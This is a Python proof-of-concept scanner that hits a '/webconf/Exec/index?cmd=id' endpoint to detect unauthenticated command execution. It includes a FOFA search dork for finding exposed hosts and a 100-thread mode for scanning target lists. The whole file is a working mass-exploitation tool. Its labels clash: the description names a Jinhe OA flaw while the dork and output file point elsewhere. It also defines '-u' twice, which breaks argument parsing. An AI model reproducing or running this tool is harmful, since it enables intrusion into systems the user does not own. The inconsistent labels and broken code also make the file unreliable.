# fofa：body="'/needUsbkey.php?username='"

import argparse, requests, sys, time, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                ██╗    ██╗   ██╗███╗   ███╗███████╗███╗   ██╗ ██████╗ 
                ██║    ██║   ██║████╗ ████║██╔════╝████╗  ██║██╔════╝ 
                ██║    ██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║██║  ███╗
                ██║    ╚██╗ ██╔╝██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
                ███████╗╚████╔╝ ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
                ╚══════╝ ╚═══╝  ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                    author:秋妤
                                                                    date:2024.09.25
                                                                    version:1.0
    """
    print(test)


def poc(target):
    api_payload = "/webconf/Exec/index?cmd=id"
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:122.0)Gecko/20100101Firefox/122.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close'
    }

    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and 'uid' in response.text:
            print(f"[+]{target} 存在命令执行漏洞")
            with open('绿盟_result.txt', 'a') as fp:
                fp.write(f'{target} \n')
        else:
            print(f"[-]{target} 不存在命令执行漏洞")
    except:
        print(f"[*]无法访问")


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 金和OA 未授权漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()